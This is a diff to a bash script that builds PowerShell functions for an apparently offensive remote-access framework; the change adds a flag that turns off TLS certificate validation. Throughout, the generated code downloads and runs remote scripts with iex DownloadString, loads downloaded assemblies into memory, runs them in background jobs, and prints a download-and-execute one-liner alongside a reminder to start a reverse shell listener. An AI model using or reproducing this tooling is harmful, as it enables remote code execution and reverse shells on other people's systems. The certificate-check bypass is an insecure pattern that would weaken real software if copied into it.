@@ -55,7 +55,7 @@ deploy_get() {
 
     cat <<EOF
 function Get-$name {
-    ${tls:+$validation}
+    ${skip_validation:+$validation}
     $client.DownloadString("$url/$path")
 }
 function Deploy-$name {
@@ -80,7 +80,7 @@ deploy_get_bin() {
 
     cat <<EOF
 function Import-$name {
-    ${tls:+$validation}
+    ${skip_validation:+$validation}
     Import-Module -Assembly (
         [System.Reflection.Assembly]::Load(
             $client.DownloadData("$url/$path")
@@ -109,19 +109,6 @@ deploy_run() {
 
     deploy_get "$name" "$path"
     cat <<EOF
-function Invoke-$name {
-    ${tls:+$validation}
-    iex $client.DownloadString("$url/$path")
-}
-function Invoke-${name}InBg {
-    Start-Job -ScriptBlock (
-        [scriptblock]::Create(
-            'Start-Process -ArgumentList "-c", (
-                [scriptblock]::Create(\$(Get-$name))
-            ) -NoNewWindow powershell'
-        )
-    )
-}
 function Deploy-${name}InBg {
     Param
     (
@@ -136,6 +123,19 @@ function Deploy-${name}InBg {
     ) -Session \$sess
     sleep 1
     Get-Job | select -last 1 | Receive-Job
+}
+function Invoke-$name {
+    ${skip_validation:+$validation}
+    iex $client.DownloadString("$url/$path")
+}
+function Invoke-${name}InBg {
+    Start-Job -ScriptBlock (
+        [scriptblock]::Create(
+            'Start-Process -ArgumentList "-c", (
+                [scriptblock]::Create(\$(Get-$name))
+            ) -NoNewWindow powershell'
+        )
+    )
 }
 EOF
 }
@@ -201,6 +201,8 @@ Options:
                          (default: 4444)
     --rshell=FILE        Use the specified rshell filename instead of
                          rshell.html
+    --skip-validation    Disable TLS certificate validation (for use
+                         with self-signed certs)
     --tls                Use TLS
     -u, --update         Update git submodules before starting server
 
@@ -209,7 +211,7 @@ EOF
 }
 
 declare -a args deps
-unset help certfile keyfile tls update
+unset help certfile keyfile skip_validation tls update
 color="true"
 config="config.default"
 deps+=("git")
@@ -246,6 +248,7 @@ while [[ $# -gt 0 ]]; do
         "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
         "-r"|"--rport"*) rport="$(long_opt "$@")" || shift ;;
         "--rshell"*) rshell_ps1="$(long_opt "$@")" || shift ;;
+        "--skip-validation") skip_validation="true" ;;
         "--tls") tls="true" ;;
         "-u"|"--update"*) update="true" ;;
         *) args+=("$1") ;;
@@ -299,6 +302,8 @@ if [[ -n $tls ]]; then
     elif [[ ! -f $keyfile ]]; then
         errx 7 "Specified key PEM file doesn't exist"
     fi
+else
+    unset skip_validation
 fi
 
 # Use "./config" if it exists and a config wasn't specified
@@ -312,7 +317,7 @@ client="(New-Object System.Net.WebClient)"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
 red="\$([char]27)[41m"
 reset="\$([char]27)[0m"
-if [[ -n $tls ]]; then
+if [[ -n $skip_validation ]]; then
     validation="[System.Net.ServicePointManager]::"
     validation+="ServerCertificateValidationCallback={\$true}"
 else
@@ -356,7 +361,7 @@ function prompt {
 EOF
 
 # Let user know what to type
-[[ -z $tls ]] || info "$validation"
+[[ -z $skip_validation ]] || info "$validation"
 info "iex $client.DownloadString(\"$url/$invade_ps1\")"
 warn "Don't forget your reverse shell listener on port $rport"
 
